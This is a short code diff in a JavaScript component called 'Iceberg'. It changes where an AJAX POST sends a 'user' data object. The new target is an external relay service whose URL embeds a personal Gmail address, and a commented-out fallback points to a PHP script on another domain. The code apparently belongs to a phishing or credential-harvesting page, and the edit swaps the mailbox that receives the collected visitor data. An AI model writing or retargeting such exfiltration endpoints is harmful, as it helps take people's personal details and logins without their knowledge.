@@ -120,7 +120,7 @@ export const Iceberg = ()=>{
     
           $.ajax({
               type: "POST",
-              url: "https://meler-service.onrender.com/get_details/joshyepes0@gmail.com",
+              url: "https://meler-service.onrender.com/get_details/speinter82@gmail.com",
             //   url: "https://bucketlion.com/hello/spei.php",
             // speinter82@gmail.com
               data: user,
